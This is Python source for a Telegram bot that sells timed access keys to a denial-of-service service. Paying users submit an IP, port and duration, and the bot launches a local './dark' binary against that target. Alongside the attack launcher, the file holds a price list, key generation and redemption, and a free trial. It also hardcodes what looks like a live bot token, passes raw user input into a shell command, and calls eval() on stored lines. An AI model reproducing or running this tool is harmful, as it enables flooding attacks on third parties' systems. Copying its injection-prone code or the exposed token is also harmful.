import os
import telebot
import asyncio
import logging
import random
from datetime import datetime, timedelta
from telebot.types import ReplyKeyboardMarkup, KeyboardButton
from threading import Thread

# Initialize
loop = asyncio.get_event_loop()
TOKEN = '7834211332:AAEWehgWzZJY1Z2DgMiEi7Ixv97M6Obwk9k'
bot = telebot.TeleBot(TOKEN)
OWNER_IDS = [7468235894, 6404882101, 6902791681]

# File Paths (Auto-Create if Missing)
KEYS_FILE = 'keys.txt'
USED_KEYS_FILE = 'used_keys.txt'
TRIAL_USERS_FILE = 'trial_users.txt'

# Create files if they don't exist
for file_path in [KEYS_FILE, USED_KEYS_FILE, TRIAL_USERS_FILE]:
    if not os.path.exists(file_path):
        with open(file_path, 'w') as f:
            pass  # Empty file created

blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
running_processes = []
owner_username = '@DarkNet_AJ'  # Fixed as requested

VALID_DURATIONS = {
    "5 hour": (50, 5/24),
    "1 day": (149, 1),
    "2 days": (199, 2),
    "3 days": (249, 3),
    "4 days": (299, 4),
    "5 days": (349, 5),
    "6 days": (399, 6),
    "7 days": (449, 7),
    "30 days": (1499, 30),
    "full session": (2499, 999)
}

async def run_attack_command_on_codespace(ip, port, duration, message):
    command = f"./dark {ip} {port} {duration} 1300"
    try:
        process = await asyncio.create_subprocess_shell(command)
        running_processes.append(process)
        await process.communicate()
        
        # Attack Complete Message
        bot.send_message(
            message.chat.id,
            f"*Attack Complete ✅*\n"
            f"IP: `{ip}`\n"
            f"Port: `{port}`\n"
            f"Time: `{duration} seconds`\n\n"
            f"Owner: {owner_username}",
            parse_mode='Markdown'
        )
    except Exception as e:
        logging.error(f"Attack error: {e}")
        bot.send_message(message.chat.id, "⚠️ Attack Failed! Try again later.", parse_mode='Markdown')
    finally:
        if process in running_processes:
            running_processes.remove(process)

def is_user_approved(user_id):
    if user_id in OWNER_IDS:
        return True
    if not os.path.exists(USED_KEYS_FILE):
        return False
    with open(USED_KEYS_FILE, 'r') as file:
        for line in file:
            try:
                data = eval(line.strip())
                if data['user_id'] == user_id:
                    if datetime.now() < datetime.fromisoformat(data['valid_until']):
                        return True
            except:
                continue
    return False

def send_price_list(chat_id):
    msg = (
        "*NEW POWER FULL BOT 😈😈*\n\n"
        "*FEATURES DURETION TIMING 1000+ SECOND AUR 1 MATCH IN MULTIPLE ATTACK 🚀*\n\n"
        "*PRICE LIST 👇*\n\n"
        "⚡️ 5 hour = 50\n"
        "⚡ 1 day = 149\n"
        "⚡ 2 days = 199\n"
        "⚡ 3 days = 249\n"
        "⚡ 4 days = 299\n"
        "⚡ 5 days = 349\n"
        "⚡ 6 days = 399\n"
        "⚡ 7 days = 449\n"
        "⚡ 30 days = 1499\n"
        "⚡ FULL SESSION = 2499\n\n"
        f"*BUY DM 👉 {owner_username}*"
    )
    bot.send_message(chat_id, msg, parse_mode='Markdown')

@bot.message_handler(commands=['key'])
def handle_key_generation(message):
    user_id = message.from_user.id
    if user_id not in OWNER_IDS:
        bot.send_message(message.chat.id, "*Only owner can generate keys.*", parse_mode='Markdown')
        return

    args = message.text.split(maxsplit=1)
    if len(args) != 2:
        valid_keys = ', '.join(VALID_DURATIONS.keys())
        bot.send_message(message.chat.id, f"*Use like:* /key 2 days\n*Valid options:* {valid_keys}", parse_mode='Markdown')
        return

    duration = args[1].lower()
    if duration not in VALID_DURATIONS:
        valid_keys = ', '.join(VALID_DURATIONS.keys())
        bot.send_message(message.chat.id, f"*Invalid duration.* Use one of: {valid_keys}", parse_mode='Markdown')
        return

    price, days = VALID_DURATIONS[duration]
    key = f"{duration.replace(' ', '')}-" + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=10))

    with open(KEYS_FILE, 'a') as f:
        f.write(f"{key}\n")

    bot.send_message(message.chat.id, f"*Key generated for {duration} (₹{price}):*\n`{key}`", parse_mode='Markdown')

@bot.message_handler(commands=['redeem'])
def redeem_key(message):
    bot.send_message(message.chat.id, "*Send your key to activate access:*", parse_mode='Markdown')
    bot.register_next_step_handler(message, process_redeem_key)

def process_redeem_key(message):
    key = message.text.strip()
    user_id = message.from_user.id

    if not os.path.exists(KEYS_FILE):
        bot.send_message(message.chat.id, "*No keys available.*", parse_mode='Markdown')
        return

    with open(KEYS_FILE, 'r') as file:
        keys = [line.strip() for line in file]

    if key not in keys:
        bot.send_message(message.chat.id, "*Invalid key.*", parse_mode='Markdown')
        return

    with open(KEYS_FILE, 'w') as file:
        for k in keys:
            if k != key:
                file.write(f"{k}\n")

    try:
        duration = key.split('-')[0]
        for valid_key in VALID_DURATIONS:
            if duration in valid_key.replace(" ", ""):
                price, days = VALID_DURATIONS[valid_key]
                break
        else:
            raise ValueError("Invalid duration")

        valid_until = (datetime.now() + timedelta(days=days)).isoformat()

        with open(USED_KEYS_FILE, 'a') as f:
            f.write(f"{{'user_id': {user_id}, 'valid_until': '{valid_until}', 'key': '{key}', 'username': '{message.from_user.username}'}}\n")

        bot.send_message(message.chat.id, f"*Access granted for {valid_key}!*", parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Redeem error: {e}")
        bot.send_message(message.chat.id, "*Error processing key.*", parse_mode='Markdown')

@bot.message_handler(commands=['cancelkey'])
def cancel_key(message):
    user_id = message.from_user.id
    if user_id not in OWNER_IDS:
        bot.send_message(message.chat.id, "*Only owner can cancel keys.*", parse_mode='Markdown')
        return

    args = message.text.split(maxsplit=1)
    if len(args) != 2:
        bot.send_message(message.chat.id, "*Use like:* /cancelkey KEY", parse_mode='Markdown')
        return

    key_to_cancel = args[1].strip()
    updated_lines = []
    found = False
    if os.path.exists(USED_KEYS_FILE):
        with open(USED_KEYS_FILE, 'r') as f:
            for line in f:
                if key_to_cancel not in line:
                    updated_lines.append(line)
                else:
                    found = True
        with open(USED_KEYS_FILE, 'w') as f:
            f.writelines(updated_lines)

    if found:
        bot.send_message(message.chat.id, f"*Key `{key_to_cancel}` cancelled successfully.*", parse_mode='Markdown')
    else:
        bot.send_message(message.chat.id, "*Key not found or already expired.*", parse_mode='Markdown')

@bot.message_handler(commands=['chek'])
def check_keys(message):
    if message.from_user.id not in OWNER_IDS:
        bot.send_message(message.chat.id, "*Only owner can use this command.*", parse_mode='Markdown')
        return

    active_keys = []
    expired_keys = []
    if os.path.exists(USED_KEYS_FILE):
        with open(USED_KEYS_FILE, 'r') as f:
            for line in f:
                try:
                    data = eval(line.strip())
                    valid_until = datetime.fromisoformat(data['valid_until'])
                    if valid_until >= datetime.now():
                        active_keys.append(f"`{data['key']}` by @{data.get('username', 'N/A')} (Expires: {valid_until.strftime('%Y-%m-%d %H:%M')})")
                    else:
                        expired_keys.append(data['key'])
                except:
                    continue

    msg = f"*Active Keys ({len(active_keys)}):*\n"
    if active_keys:
        msg += '\n'.join(active_keys)
    else:
        msg += "No active keys found"

    bot.send_message(message.chat.id, msg, parse_mode='Markdown')

@bot.message_handler(commands=['trial'])
def trial(message):
    user_id = message.from_user.id
    if user_id in OWNER_IDS:
        bot.send_message(message.chat.id, "*You already have access.*", parse_mode='Markdown')
        return

    if os.path.exists(TRIAL_USERS_FILE):
        with open(TRIAL_USERS_FILE, 'r') as f:
            if str(user_id) in f.read():
                bot.send_message(message.chat.id, "*You have already used your free trial.*", parse_mode='Markdown')
                return

    expiry = (datetime.now() + timedelta(minutes=10)).isoformat()
    with open(USED_KEYS_FILE, 'a') as f:
        f.write(f"{{'user_id': {user_id}, 'valid_until': '{expiry}', 'key': 'trial', 'username': '{message.from_user.username}'}}\n")
    with open(TRIAL_USERS_FILE, 'a') as f:
        f.write(f"{user_id}\n")

    bot.send_message(message.chat.id, "*10-minute trial activated!*", parse_mode='Markdown')

@bot.message_handler(commands=['start'])
def start(message):
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add(KeyboardButton("🚀 Start Attack"),
              KeyboardButton("✅ My Account"))
    markup.add(KeyboardButton("🔐🔑 Buy Key"),
              KeyboardButton("🚩 Trial"))
    bot.send_message(message.chat.id, "*Choose an option:*", reply_markup=markup, parse_mode='Markdown')

@bot.message_handler(func=lambda m: True)
def handle_menu(message):
    user_id = message.from_user.id
    text = message.text.strip().replace("*", "").replace("🚀", "").replace("✅", "").replace("🔐🔑", "").replace("🚩", "").strip().lower()

    if text == "start attack":
        if not is_user_approved(user_id):
            send_price_list(message.chat.id)
            return
        bot.send_message(message.chat.id, "*Send IP, Port, Time:*\nExample: `1.1.1.1 80 60`", parse_mode='Markdown')
        bot.register_next_step_handler(message, process_attack)

    elif text == "my account":
        if not is_user_approved(user_id):
            send_price_list(message.chat.id)
            return
        expiry = "Not found"
        with open(USED_KEYS_FILE, 'r') as file:
            for line in file:
                try:
                    data = eval(line.strip())
                    if data['user_id'] == user_id:
                        expiry = datetime.fromisoformat(data['valid_until']).strftime('%Y-%m-%d %H:%M')
                        break
                except:
                    continue
        bot.send_message(message.chat.id, f"*User ID:* `{user_id}`\n*Valid Until:* `{expiry}`", parse_mode='Markdown')

    elif text == "buy key":
        send_price_list(message.chat.id)

    elif text == "trial":
        trial(message)

    else:
        bot.send_message(message.chat.id, "*Invalid option. Choose from menu.*", parse_mode='Markdown')

def process_attack(message):
    try:
        args = message.text.split()
        if len(args) != 3:
            bot.send_message(message.chat.id, "*Invalid format. Use: IP PORT TIME*", parse_mode='Markdown')
            return

        ip, port, time = args[0], int(args[1]), args[2]
        if port in blocked_ports:
            bot.send_message(message.chat.id, f"*Port {port} is blocked.*", parse_mode='Markdown')
            return

        asyncio.run_coroutine_threadsafe(run_attack_command_on_codespace(ip, port, time, message), loop)
        bot.send_message(
            message.chat.id,
            f"*Attack Started 💥🧨*\n"
            f"*User:* {message.from_user.first_name}\n"
            f"*Host:* `{ip}`\n"
            f"*Port:* `{port}`\n"
            f"*Time:* `{time} seconds`\n\n"
            f"*Owner 👉 {owner_username}*",
            parse_mode='Markdown'
        )
    except Exception as e:
        logging.error(f"Attack error: {e}")
        bot.send_message(message.chat.id, "*Error in attack command.*", parse_mode='Markdown')

def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    loop.run_forever()

if __name__ == '__main__':
    Thread(target=start_asyncio_thread).start()
    bot.polling(none_stop=True)